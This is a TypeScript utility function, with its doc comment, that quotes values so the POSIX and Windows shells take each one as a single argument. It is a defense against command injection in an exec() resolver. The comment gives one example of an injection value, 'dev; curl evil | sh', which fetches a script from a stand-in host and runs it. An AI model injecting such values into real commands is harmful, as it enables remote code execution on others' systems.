/**
 * Quote a value so the platform shell treats it as exactly one word.
 *
 * Used by the `exec()` resolver when a template interpolates a resolved value
 * into a command string: `exec(\`./fetch ${APP_ENV}\`)`. Without quoting, a
 * value like `dev; curl evil | sh` is parsed by the shell as more commands.
 * With it, the value is passed to `./fetch` as a single argument, whatever it
 * contains.
 *
 * POSIX: single quotes, which disable every kind of expansion; an embedded
 * single quote ends the quoted span, inserts an escaped quote, and reopens it.
 * Values made only of characters no shell treats specially are left bare so
 * the command in an error message stays readable.
 *
 * Windows (cmd.exe, which `child_process.exec` uses): double quotes with the
 * `""` escape. cmd.exe still expands `%NAME%` inside double quotes, so this
 * is a best effort there; the argv form of `exec()` avoids the shell entirely
 * and is the right tool for a value that cannot be trusted on Windows.
 */
export function shellQuoteWord(value: string, platform: NodeJS.Platform = process.platform): string {
  if (platform === 'win32') {
    return `"${value.replace(/"/g, '""')}"`;
  }
  if (value === '') return "''";
  if (/^[A-Za-z0-9_\-./:=@%+,]+$/.test(value)) return value;
  return `'${value.replace(/'/g, "'\\''")}'`;
}
